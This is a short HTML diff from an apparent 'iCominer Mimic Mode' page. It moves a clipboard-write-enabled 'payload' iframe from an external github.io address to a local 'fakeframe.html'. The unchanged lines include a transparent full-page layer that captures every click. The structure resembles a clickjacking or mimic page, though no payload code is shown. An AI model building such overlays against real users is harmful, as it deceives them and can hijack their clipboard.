@@ -42,14 +42,9 @@
 </head>
 <body>
 
-  <!-- Overlay notice or interaction layer -->
   <div class="overlay-log">iCominer Mimic Mode - Active</div>
-
-  <!-- Transparent full-page click-capture layer -->
   <div class="click-capture" onclick="captureClick(event)"></div>
-
-  <!-- Fully controlled payload iframe -->
-  <iframe src="https://awaxrx.github.io/icominer/fakeframe.html" allow="clipboard-write; fullscreen;"></iframe>
+  <iframe src="fakeframe.html" allow="clipboard-write; fullscreen;"></iframe>
 
   <script>
     function captureClick(e) {
